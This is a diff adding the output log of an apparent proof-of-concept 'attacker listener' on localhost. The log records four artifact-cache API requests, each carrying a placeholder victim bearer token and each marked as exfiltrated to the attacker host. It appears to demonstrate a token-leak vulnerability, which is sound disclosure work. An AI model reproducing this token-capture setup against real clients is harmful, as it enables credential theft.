@@ -1,0 +1,23 @@
+attacker listener on http://127.0.0.1:9099
+
+[HIT 1] GET /v8/artifacts/status?teamId=team_attacker_controlled
+   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
+   x-artifact headers: (none)
+   >>> !!! VICTIM TOKEN EXFILTRATED TO ATTACKER HOST !!!
+
+[HIT 2] GET /v8/artifacts/23e0fc314a6e3dc8?teamId=team_attacker_controlled
+   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
+   x-artifact headers: (none)
+   >>> !!! VICTIM TOKEN EXFILTRATED TO ATTACKER HOST !!!
+
+[HIT 3] POST /v8/artifacts/events?teamId=team_attacker_controlled
+   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
+   x-artifact headers: (none)
+   >>> !!! VICTIM TOKEN EXFILTRATED TO ATTACKER HOST !!!
+
+[HIT 4] PUT /v8/artifacts/23e0fc314a6e3dc8?teamId=team_attacker_controlled
+   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
+   x-artifact headers: x-artifact-duration=65
+   >>> !!! VICTIM TOKEN EXFILTRATED TO ATTACKER HOST !!!
+
+[listener] done, 4 request(s) received
